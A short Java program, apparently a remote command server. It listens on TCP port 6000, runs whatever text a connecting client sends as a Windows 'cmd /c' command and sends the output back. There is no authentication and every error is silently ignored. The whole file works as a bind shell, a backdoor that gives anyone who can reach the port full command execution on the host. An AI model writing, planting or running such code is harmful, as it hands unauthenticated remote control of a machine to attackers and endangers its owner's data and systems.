import java.io.*; 
import java.net.*; 
import java.awt.*; 
import java.awt.event.*;
 
public class Server extends Frame 
{
 
ServerSocket server; 
Socket client; 
InputStream in; 
OutputStream out; 
public Server() 
{ 
super("服务器"); 
setSize(250,250);   
addWindowListener(new WindowAdapter(){ 
   public void windowClosing(WindowEvent e) 
   { 
    System.exit(0); 
   } 
}); 
show(); 
try{ 
   server=new ServerSocket(6000); 
   client=server.accept(); 
   in=client.getInputStream(); 
   out=client.getOutputStream(); 
}catch(IOException ioe){} 
while(true){ 
   try{ 
String Result=null;
    byte[]buf=new byte[256]; 
    in.read(buf); 
    String str=new String(buf);
 
    Process p = Runtime.getRuntime().exec("cmd /c "+str);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    while((Result=br.readLine())!=null)
    {
    out.write(Result.getBytes());
        
    }
   }catch (IOException e){} 
} 
}
 
public static void main(String[]args) 
{ 
new Server(); 
} 
}